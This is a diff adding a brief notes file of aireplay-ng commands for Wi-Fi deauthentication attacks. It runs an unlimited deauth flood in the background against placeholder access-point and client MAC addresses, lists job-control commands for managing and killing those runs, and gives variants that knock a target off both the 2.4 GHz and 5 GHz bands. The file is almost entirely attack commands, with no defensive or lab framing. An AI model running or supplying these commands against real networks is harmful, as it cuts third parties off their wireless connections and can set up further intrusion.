@@ -1,1 +1,15 @@
+UN THE DEAUTH IN THE BACKGROUND = aireplay-ng --deauth 0 -a 01:02:03:04:05:06 -c 00:05:09:07:05:06 wlan0 &> /dev/null &
+
+TO VIEW THE BACKGROUND SESSIONS = jobs
+TO KILL IT ALL OF THE BACKGROUD = killall aireplay
+TO KILL ONE OF THEM = kill %<id number>
+
+
+
+
+TO DEAUTHENTICATE BOTH BANDS FROM A TARGET:
+
+aireplay-ng --deauth 0 -a 01:02:03:04:05:06 -c 00:05:09:07:05:06 wlan0 = 2.4 GHZ
+aireplay-ng --deauth 0 -a 01:02:03:04:05:06 -c 00:05:09:07:05:06 -D wlan0 = 5 GHZ
+
 
